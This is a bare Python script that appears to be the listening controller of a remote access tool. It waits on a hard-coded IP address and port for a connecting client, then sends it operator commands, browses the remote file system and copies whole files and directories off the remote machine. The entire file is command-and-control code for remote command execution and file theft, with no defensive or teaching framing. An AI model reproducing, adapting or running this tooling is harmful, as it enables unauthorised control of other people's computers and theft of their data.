import socket
import math
import time
import struct
import os

def create_socket(ip, port):
    sock = socket.socket()
    sock.bind((ip,port))
    sock.listen(5)
    return sock

def connect(sock):
    s, address = sock.accept()
    return s, address

def send(s, text):
    s.send(bytes(text + "\n", "utf-8"))

def recv2(s):
    buffer = s.recv(32).decode("utf-8").replace("buffer: ", "")
    normal_buffer = 1024
    buffer = int(buffer) + 1
    send(s, "ok")
    times_to_recieve = buffer / normal_buffer
    print(times_to_recieve)
    output = ""
    times_to_recieve = math.ceil(times_to_recieve)
    print("number of times to recieve "+ str(times_to_recieve))
    for a in range(0, times_to_recieve):
        print("reciving: " + str(a))
        new_output = s.recv(normal_buffer).decode("utf-8")
        output = output + new_output
        print(len(output))
  

    return output

def recv(s):
    buffer = s.recv(32).decode("utf-8").replace("buffer: ", "")
    new_buffer = 1025
    buffer = int(buffer) + 1
    send(s, "ok")
    times_to_recieve = buffer / new_buffer

    output = ""
   
    while len(output) != buffer:
        
        output = output + s.recv(buffer).decode("utf-8")
    return output

def cd(cmd, output, client):
    currentpath = output.replace("currentpath:", "")
    currentpath = currentpath.split("/")

    newpath = ""
    if cmd.replace("cd ", "") == "..":
        currentpath = currentpath[:-1]
        
        for a in currentpath:
            if a != "":
                newpath = newpath + "/" + a
        newpath = newpath.replace("/ ","")
    
    else:
        currentpath[-1] = currentpath[-1][:-1]
        
        for a in currentpath:
            if a != "":
                newpath = newpath + "/" + a
        newpath = newpath +"/"+cmd.replace("cd ","")
        newpath = newpath.replace("/ ","")
    return newpath

def get_input(client):
    cmd = input("cmd -> ")

    send(client,cmd)
    output = (recv(client))
    return cmd, output
def download(filetype, client, cmd):
    
    if filetype == "file\n":
        downloadfile(client)

    elif filetype == "dir\n":
        os.mkdir(cmd.replace("download ",""))
        os.chdir(cmd.replace("download ",""))
        send(client,"ok")
        number_of_files = int(recv(client).replace("number_of_files: ",""))
        send(client,"ok")
        for a in range(0, number_of_files):
            downloadfile(client)

def download2(client):
    filetype = recv(client)
    if filetype == "file\n":
        downloadfile(client)
        send(client, "done")
        print(recv(client))

    elif filetype == "dir\n":
        folder_name = recv(client)[:-1].split("/")[-1]
        try:
            os.mkdir(folder_name)
        except:
            pass
        os.chdir(folder_name)
      
        number_of_files = int(recv(client).replace("number_of_files: ",""))

        for a in range(0, number_of_files):
            download2(client)
        

def downloadfile(client):
    filename = recv(client)
    filename = filename.replace("downloading ","")[:-1]
    print("starting")
    buf = bytes()
    while len(buf) < 4:
        buf += client.recv(4 - len(buf))
    size = struct.unpack('!i', buf)[0]
    with open(filename, 'wb') as f:
        while size > 0:
            data = client.recv(1024)
            f.write(data)
            size -= len(data)
    print('Image Saved')
 
    
def commands(cmd, output, client):
    if output.startswith("currentpath:") and cmd.startswith("cd "):

        newpath = cd(cmd,output, client) 
        send(client, "newpath:" + newpath)

        output = recv(client)
    if cmd.startswith("download "):
            download2(client)
            output = (recv(client))
    if cmd.startswith("user "):
        cmd = cmd.replace("user ", "")
        if (cmd.startswith("cd ")):
            os.chdir(cmd.replace("cd ",""))
        else:
            os.system(cmd)
           
    return output

try:

    sock = create_socket("3.1.5.104",4422)
    client, address = connect(sock)

    print(recv(client))
    send(client,"hey sup")

    while True:
    
        cmd, output = get_input(client)
        output = commands(cmd, output, client)
        print(output)


except KeyboardInterrupt as e:  
    print(e)   
    exit(1)
